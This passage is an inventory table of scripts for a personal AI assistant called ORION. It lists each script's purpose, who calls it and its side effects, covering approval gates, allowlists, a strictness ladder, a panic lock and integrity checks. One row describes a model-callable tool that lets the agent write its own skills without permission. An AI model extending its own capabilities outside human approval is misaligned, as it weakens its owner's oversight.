| orion-health | node | Read-only sleep/recovery/tracking from the health log | model | none |
| orion-help | node | Full usage of one tool from tools-detail.json | model | none |
| orion-identity-check | zsh | Does a new build keep the installed code-signing identity | model (allowlisted)/human | none |
| orion-incident | bash | Phase 74: the steps for when something has gone wrong, in one command (section 10.2) | human | may stop services/lock; see section 10 |
| orion-incident-timeline | node | Merged incident timeline from four audit logs | human | none |
| orion-interface | zsh | Starts TTS daemon, checks gateway, starts and opens the standalone interface | human | starts processes |
| orion-keys | zsh | Check/set API keys in .env; asks the vendor (section 9.6) | human | vendor API calls; edits .env |
| orion-learn | node | Reads what happened, proposes learnings; never changes anything itself | model (allowlisted)/human; no cron caller found | writes proposal files only |
| orion-life | node | Show or set planning preferences: set, min (minimums), rank (priorities). | model | Writes life-config.json. |
| orion-lights | node | Controls Nick's Bluetooth LED strip (on, off, brightness, color, scan) through the ORION Mac app, waiting for its status file. | model/app/human | Runs `open -g orion://lights?...`; app does BLE; reads lights-status.json; exit 1 if app not running or no answer in 20 s. |
| orion-local-tts | zsh | Thin TTS client spawned once per spoken reply by OpenClaw tts-local-cli | gateway | audio file via TTS daemon |
| orion-lock | node | Panic button: stop dispatch, cancel jobs, suspend automations (Phase 43) | human/model (allowlisted; listed as LOCK ORION in `self-development-authority.ts:54`); no app caller found | halts ORION activity; writes lock state |
| orion-log | node | Log water or food to the health log | model | writes health log (locked file) |
| orion-log-audit | node | Finds recurring failures in real chats (candidate eval cases) | human | none |
| orion-login-item | zsh | Adds, removes or checks Orion.app in macOS Login Items so the menu-bar app starts at login. | human | Edits System Events login items (system setting) via osascript; needs Automation permission; opt-in. |
| orion-messages | node | Reads iMessages so ORION can answer "what did X say" | model | reads Messages database read-only |
| orion-messages-send | node | Sends one iMessage/SMS as Nick; dangerous half, own file | model with approval | sends a real message |
| orion-mic-doctor | zsh | Diagnoses why push-to-talk cannot hear | model (allowlisted)/human | none |
| orion-mission | node | Autonomous missions: give an outcome, come back to finished work | model/human | starts long jobs; writes mission records |
| orion-mode | node | Sets strictness mode (contained, guarded, open, sovereign) with expiry and exceptions; relaxing needs owner re-auth. | human | Writes orion-gate/strictness.json; Touch ID prompt on relax. |
| orion-morning | node | Morning briefing when the phone says Nick is up: screen, lights, spoken aloud on the Mac. | app | Writes morning-view.json, morning-sent.json, morning.log; opens orion:// URL; runs orion-lights and orion-reach (speech). |
| orion-next | node | Pure what-to-do-next function over a day JSON file (do, prepare, free, sleep). | human | None (reads FILE). |
| orion-note | node | Write/list/show provenance-stamped notes in the Obsidian vault ~/Documents/orionBrain. | model | Writes markdown notes and .bak copies in the vault. |
| orion-notify | node | Mission events (started, milestone, decision, blocked, complete) with dedupe, rate limits, quiet hours 23-08, overnight digest; sends via Discord webhook. | model/human | Writes remote.json under lock; calls orion-discord-alert (Discord message) or openclaw message send; no eval guard of its own. |
| orion-now | node | One recommendation for right now from live day, sleep plan, phone signal, check-ins, patterns. | model/app | None (reads calendar, health-log.json, checkins.json). |
| orion-ontask | node | On-task status/snooze/allow/wrong/act (section 6) | model/app | writes focus state; can nudge/lock |
| orion-ontask-watch | node | Schedule focus supervision driven by the app's activity sample | app (every 30 s) | state files; may invoke orion-ontask act |
| orion-patterns | node | Prints Nick's typical bed/wake times, late-night phone use, WHOOP trends, lateness stats. | model | None (reads health-log.json, life-history.jsonl). |
| orion-permissions | zsh | Explains why Accessibility shows granted but is not | model (allowlisted)/human | none |
| orion-phone-time | node | Phone Screen Time lock status/control from the Mac | model/human | writes phone-lock request via sync |
| orion-plan-study | node | Finds real free slots for a study request on the live calendar; --book writes movable study blocks. | model | With --book: Calendar events tagged [orion:study], undo journal; otherwise none. |
| orion-presence | node | Read-only: prints where Nick is (idle, locked, headphones, out) and which channel orion-reach would use now. | human/model | Read-only; runs ioreg, pmset, system_profiler, osascript, orion-now. |
| orion-privacy | node | Privacy controls (revoke, delete) | human (only orion-backup mentions it; no app caller found) | deletes data / revokes grants |
| orion-proactive | node | Every 5 minutes decides if anything is worth saying (session end, leave, free gap, due, bedtime) and sends it through orion-reach; once per key per day. | app/human | Writes proactive-sent.json; spawns orion-reach (messages Nick); reads Reminders, calendar, session, focus history; no-op in eval sandbox. |
| orion-probe-agent | zsh | Captures exactly what `openclaw agent --json` returns | human | one agent call (paid) |
| orion-probe-app | zsh | Compares CLI vs Orion.app path for the same request | human | agent call (paid) |
| orion-probe-plugin | zsh | Is orion-control loaded and why exec is there | human (also on the exec allowlist) | read-only |
| orion-probe-tools | zsh | Why orion_task_run fails (trust hardening) | human (also on the exec allowlist) | read-only/agent probe |
| orion-project | node | Milestone tracker for multi-day real-life projects: list, add, milestone, done, close. | model | Writes projects.json (read by orion-standing). |
| orion-project-agent | node | Operator controls for a running project: status, pause, resume, stop, exterminate, steer, resolve, set-model, alerts. | app/human | Writes run state and exterminate.json; may SIGKILL the supervisor pid. |
| orion-project-queue | node | Runs several projects in order: start, status, cancel. | human/model (via orion-project-run) | Writes queue.json; spawns detached runner and orion-projects launch. |
| orion-project-run | node | Chat/phone front for local projects: list, start, status, stop, pause, resume; never enables execution. | model | Starts/stops local-model project runs via orion-projects and orion-project-agent. |
| orion-projects | node | Local project-agent library: list, add, refresh, rebrief, preflight, launch, serve. | app/human | Creates worktrees and detached agent runs; writes launch.json, agentic config; Discord alert on failure. |
| orion-python | zsh | Resolves the Python interpreter that can import mlx_audio (TTS) and execs it | launchd tts plist, orion-tts-install, orion-keys, orion-interface | execs python; no writes |
| orion-quick | node | One JSON line for the Option-Tab quick menu: now, next, focus today, phone lock state. | app | None (runs orion-phone-time status). |
| orion-reach | node | ORION starts a conversation: picks phone, silent Mac bubble or spoken Mac by presence, dedupes, rate-limits, writes ledger and phone outbox. | model/cron/app | Appends outreach.jsonl and outreach-outbox.jsonl; runs `open -g orion://reach?id=`; Mac speaks aloud or phone notification via Link app; refuses in eval mode (exit 0). |
| orion-readiness | python | Static design assessment of the manifest final success condition | human | none |
| orion-recall | node | Semantic search of ORION's own memory via openclaw memory search; one block, 8 lines. | model | None (local embeddings index, no cloud). |
| orion-remember | node | Append-only memory write: today's ## Noted section, or --user to USER.md; refuses secrets. | model | Appends to workspace/memory/DAY.md or workspace/USER.md. |
| orion-remote | node | Inbound handler for phone and Discord: guards, 12 fixed verbs, then one OpenClaw brain turn; also inject/poll/audit over file queues. | model/app/human | appends remote-audit.jsonl; writes remote-inbound.json, remote.json, actions/cancel files; may spawn orion-mission/orion-project-agent; runs `openclaw agent` (paid model call); saves standing rules to config, USER.md and vault note |
| orion-remote-bridge | node | Outbound Discord gateway WebSocket client that hands allowlisted DMs/@mentions to `orion-remote handle` and posts replies. | cron/human | opens wss://gateway.discord.gg and calls Discord REST; writes remote-link.json; stdout log; spawns orion-remote per message; posts messages to Discord |
| orion-remote-install | bash | Copies scripts/ to ~/.openclaw/orion-remote, records integrity manifest, writes and loads the com.nickmadaio.orion.remote LaunchAgent; --status/--remove. | human | writes ~/.openclaw/orion-remote, installed .env (2 values), integrity manifest, plist; launchctl bootout/bootstrap/kickstart restarts the bridge |
| orion-repair | zsh | Self-repair of plugin/gateway beyond Swift with rollback (section 10.1) | model/human (gated) | replaces installed plugin, restarts gateway |
| orion-reschedule | node | Planner that moves Nick's day around what happened: late, busy, overrun, now, add, day, move, swap, extend, resize, skip, early, drop, clear, undo. | model/app | Writes Apple Calendar via bridge; reschedule-undo.json, pins.json, skipped-events.json, reschedule.lock; no network. |
| orion-reset-session | zsh | Retires a poisoned session | human | archives session |
| orion-runs | node | Read-only status of dev-loop runs | model | none |
| orion-selfdoc | node | Regenerates TOOLS.md from what is true now (tools, shell, permissions) | model (allowlisted), deploy, CI check, plugin catalog refs | writes workspace TOOLS.md |
| orion-session | node | Focus session client: start/stop through Orion.app, which owns state | model/app | asks app to write focus-state.json |
| orion-setup | zsh | One-command build, sign, install, start | human | builds and installs app; starts daemons |
| orion-shortcut | node | Lists and runs Nick's Shortcuts marked for ORION | model | runs a macOS Shortcut |
| orion-show | bash | Opens orion://show/<tab> in the Mac app | model | brings a tab forward |
| orion-sign-setup | zsh | Creates a stable local code-signing identity once | human | writes keychain identity |
| orion-skill | node | ORION writes his own skills without permission | model | writes skill files |
| orion-standing | node | Hourly standing orders: morning, evening, check, auto; says only what changed. | model/cron | None itself; optional orion-notify delivery with --notify; optional local gpt-oss:20b with --polish. |
| orion-study | node | Fit a study request into a day JSON file (pure test/eval harness). | human | None (reads FILE). |
| orion-tasks | node | To-dos with due dates, spreads and priorities; books sessions through orion-reschedule and sweeps finished ones. | model/app | Reminders create/update; calls orion-reschedule (Calendar writes); task-sessions.json. |
| orion-timezone | node | Home timezone status/plan/set/expect (section 9.3) | human | set edits cron jobs and location.json |
| orion-tools | python | Reviews tools ORION wants to add to himself | human | writes approvals |
| orion-trace | node | Renders session transcript and trajectory to debug a turn | human/model | none |
| orion-tts-install | bash | Installs/starts the TTS daemon LaunchAgent (--status) | human | installs LaunchAgent |
| orion-undo | node | Undo ledger-recorded file moves/renames/copies/trash; dry-list by default, --yes performs. | human | Renames files back; appends undo-audit.jsonl. |
| orion-usage | node | Model usage and cost report (section 9.5) | app/human | writes usage-cache.json only |
| orion-v3-energy | node | Battery-energy measurement for the V3 local-model evaluation (idle vs model load) | human | Loads a local model in Ollama; reads the battery gauge via `ioreg` (no sudo); refuses unless on battery; appends to the V3 ledger |
| orion-v3-eval | node | V3 local-model evaluation runner: build cases, split, run, report | human, orion-v3-queue | Local model calls only; writes `runs/<id>/` and one ledger line under `~/.openclaw/orion-controlled/evals/v3` (`scripts/lib/eval/v3/ledger.mjs`); `report` builds a markdown report |
| orion-v3-logs | node | Phase 1 of V3 eval: flattens every real turn from sessions into a dataset | human | Read-only on sessions and chat threads; writes one flattened dataset (0600) under `~/.openclaw/orion-controlled/evals/v3/logs`; refuses a directory inside the repo; prints counts only |
| orion-v3-pipeline | node | Phase 8 of V3 eval: runs front model plus tiers over jobs J3/J6 | human, eval/v3/ops/local-acceptance | Front desk via direct Ollama, then the tier model through the REAL route (`orion-remote handle`), so not purely local; sets the global eval-mode marker; refuses if ORION was used in the last 15 minutes; writes result files |
| orion-v3-queue | zsh | Runs queued V3 jobs one at a time until the queue empties or STOP exists | human | Job files `<n>.job` hold either arguments for `orion-v3-eval` or a `!shell command`; runs them one at a time; pauses on battery |
| orion-verify-gate | zsh | Restarts gateway and proves the gate is in the path | human (also on the exec allowlist) | restarts gateway |
| orion-voiceid-install | bash | Installs/starts the voice-ID LaunchAgent (--status) | human | installs LaunchAgent |
| orion-waiting | node | Lists approval tickets with no grant yet; cannot approve. | model | None (reads orion-gate/approvals). |
| orion-wake | node | Sets, shows or clears a manual wake-up alarm on Nick's iPhone by publishing a request the phone link syncs. | model/human | Writes/removes wake-request.json; reads ORION Link status.json; exit 0 even if the phone link is not running. |
| orion-watch | node | Ticker that notices the day: empty-day question, short-night reshape, class reminders, morning brief, night markers. | app/model | Writes watch.json, night.json, alerts-outbox.jsonl, life-history.jsonl; may write Calendar; runs orion-tasks. |
| orion-watches | node | Standing watches: weather, important texts (gate), important mail; tells Nick via orion-reach. | app/model | Writes watches.json; local qwen3.5:9b call; Gmail search; sends messages via orion-reach. |
| orion-weather-alert | node | Fetches a 3-day open-meteo forecast (Fahrenheit) for the home place and sends it to Discord through orion-discord-alert. | cron/human (inferred; section 4.7) | Network to open-meteo; sends a real Discord message; reads location.json; model told never to run it for questions. |
| orion-why | node | Explains past runs from the task ledger (never from the model); can/cannot delegates to orion-authority. | human | None (reads task-ledger.jsonl). |
| orion_enroll_voice.py | python | Records enrolment samples and hands them to the voice-ID daemon | orion-enroll-voice | records microphone audio; writes voice profile via daemon |
| orion_forge_edit.py | python | Stages a targeted edit to one of Orion's own Swift sources | orion-forge, orion-repair | writes staged source copy |
| orion_make_icon.py | python | Renders the app icon from the hologram sphere geometry | native/Orion/make_app_bundle.sh | writes icon image files |
| orion_phone_approval_scenario.py | python | Simulator test: registered phone signs an approval confirmation | human (test) | iOS Simulator only; disposable fixtures |
| orion_phone_http_session_scenario.py | python | Simulator test: phone signs a challenge and receives a session over HTTP | human (test) | Simulator and loopback listener only |
| orion_phone_preview.py | python | Bounded local-only personal plan preview in iPhone Simulator | human (native/OrionMobile README) | Simulator only |
| orion_phone_session_scenario.py | python | Simulator test: persistent key to signed session | human (test) | Simulator only; private Simulator files |
| orion_tts_client.py | python | Socket-protocol client for the TTS daemon; the part orion-local-tts calls | orion-local-tts, tests | writes audio file; talks to local daemon socket |
| orion_tts_daemon.py | python | Persistent local TTS daemon (keeps model loaded, avoids per-call spawn) | launchd com.nickmadaio.orion.tts, native TTSClient.swift | holds a socket, writes audio files, loads MLX model |
| orion_v2_anthropic_key_status.py | python | Verifies replacement and saved Anthropic key items without printing values | human | reads Keychain; may make a key-validity call; prints only status |
| orion_v2_attack_check.py | python | Phases 68-69: holds attack-coverage maps to the tests they claim | orion-deploy (`scripts/orion-deploy:139`), orion_v2_ci_check.sh (`:161`), human | reads only |
| orion_v2_audit_check.py | python | Proves the redactor holds and live audit rows fit the v2 contract | orion_v2_ci_check.sh (`:231`), human | reads only |
| orion_v2_authority_contract_check.sh | bash | Cross-language contract for the Phase 42 automation-permissions panel | orion-deploy (`:141`), human; the CI script only lists it as a slow check to run separately | builds and reads only |
| orion_v2_authority_snapshot.py | python | Exports a sanitized versioned snapshot of live authority map | orion-deploy (`:301`, refreshes the snapshot), human | writes snapshot JSON (docs/planning/v2/CURRENT_AUTHORITY.json) |
| orion_v2_backup_check.sh | bash | Phase 73: proves the backup pipeline works before it is needed | human (the CI script lists it as a slow separate check; orion-backup mentions it in a comment) | writes scratch backups/restores |
| orion_v2_build_capability_registry.py | python | Generates the capability registry from the live catalog | human | writes registry JSON |
| orion_v2_capability_check.py | python | Proves the registry still describes the compiled catalog | CI, human | reads only |
| orion_v2_ci_check.sh | bash | Phase 70: checks that run anywhere, shared by CI and this Mac | orion-deploy (runs it with `--quick`, `:138`), human; orion-incident only prints it as a step | runs tests; reads only (may write temp files) |
| orion_v2_deferred_check.py | python | Phase 76: enforces the deferral list | human | reads only |
| orion_v2_ingest_inference.py | python | Builds the inference ledger from records OpenClaw already wrote | human | reads session records; writes ledger |
| orion_v2_integrity_check.sh | bash | Phase 48: installed copy changed outside installer does not run | human | sandbox copy only |
| orion_v2_inventory_check.py | python | Phase 71: holds the data inventory to the system | CI, human | reads only |
| orion_v2_keychain_seed.py | python | Seeds OpenClaw Keychain items without printing credential values | human | writes Keychain items |
| orion_v2_live_smoke.py | python | Runs one non-mutating tool through the installed agent route | human, tests | one paid model call; prints sanitized pass/fail |
| orion_v2_lock_check.sh | bash | Phase 43: does the panic button (lock) still work | orion-deploy (`:142`), human | exercises lock in scratch environment |
| orion_v2_mobile_check.sh | bash | Builds and self-checks MobileCore for macOS and iOS | human | builds only |
| orion_v2_model_contract_check.py | python | Proves the role contract is the single source of truth | human | reads config only |
| orion_v2_phase_gate.py | python | Validates PHASE_GATES.json and refuses skipped-phase work | orion-deploy (`:144`), orion_v2_workflow_check.py, tests | reads only |
| orion_v2_phone_check.sh | bash | Builds and exercises the phone shell in Simulator | human | Simulator only |
| orion_v2_phone_pairing_check.py | python | Disposable two-device pairing proof via Simulator key | human | temp registry, loopback listeners |
| orion_v2_phone_read_check.py | python | Simulator-to-loopback fixture scenario with cleanup | human | temp grant and store, cleaned up |
| orion_v2_policy_check.py | python | Proves the policy engine is never more permissive than the live gate | CI, human | reads only |
| orion_v2_reauth_check.sh | bash | Phase 43: loosening guard needs owner in person (scratch HOME test) | human | scratch HOME only |
| orion_v2_remote_check.sh | bash | Phases 43/45: inbound channel guards | orion-deploy (`:143`), human | scratch environment; no real sends |
| orion_v2_rules_check.py | python | Permanent architectural "Never" rules checked against the running machine | human | reads only |
| orion_v2_schema_check.py | python | Schema, migrations and manifest describe one database | human | reads only |
| orion_v2_secret_inventory.py | python | Inventories local secret locations without values or fingerprints | human | reads file metadata; writes inventory JSON |
| orion_v2_secret_scan.py | python | High-confidence secret scan with redacted output (location, rule, short hash) | CI, human | reads repo |
| orion_v2_secretref_plan.py | python | Generates a value-free Keychain SecretRef migration plan | human | reads config; prints plan |
| orion_v2_source_checkpoint.py | python | Creates a local source-only checkpoint without touching index or worktree | human | writes git objects locally (write-tree); does not touch index or worktree |
| orion_v2_strictness_check.sh | bash | Approval gate and strictness ladder checked against the live system | orion-deploy (`:140`), human | exercises live gate (non-mutating) |
| orion_v2_sync_check.py | python | Proves backend and MobileCore ordering rules agree | human | reads only |
| orion_v2_trash_recovery_check.sh | bash | Phase 47: a deleted file goes to Trash and is recoverable | human | creates and deletes a scratch file |
| orion_v2_workflow_check.py | python | Phase 75: holds a change to the eighteen steps | human | reads only |
| orion_v2_workspace_sync.sh | bash | Copies repo plugin/workspace/ to the live ~/.openclaw/workspace/ Orion reads | CI check, human | writes live workspace files |
| orion_voiceid_daemon.py | python | Speaker-verification daemon: wake for Nick, not the room | launchd com.nickmadaio.orion.voiceid, SpeakerVerifier.swift | listens on a local socket; reads voice profile |
| scripts/eval/ (directory) | node | Eval fixtures and v3 ops (auto-freeze, local-acceptance); chapter 09 | human, eval runners | varies; model calls when run |
| scripts/lib/agentic/ (directory) | node | Agentic dev-loop library; chapter 09 | agentic scripts | writes plans/briefs/worktrees |
| scripts/lib/cert_days_left.py | python | Days until a code-signing certificate expires, matched by SHA-1 fingerprint from `security find-certificate` output on stdin | scripts that check the Orion Local Signing cert (inferred) | reads stdin only |
| scripts/lib/conversation-bench/ (directory) | node | Conversation-benchmark library for orion-conversation-bench | orion-conversation-bench | dry run by default |
| scripts/lib/eval/ (directory) | node | Eval library: grading, sandbox bridge, v3 reports; chapter 09 | eval CLIs, life bridge-path | writes eval outputs |

### Questions to ask your tutor (index)
1. Which scripts are on the model's exec allowlist and which are deliberately off it, and where is the allowlist stored?
2. Pick any `orion-*` script and trace who calls it using only the table and `grep`.
3. Why are the `orion_v2_*` gate checks separate programs rather than plugin tests?
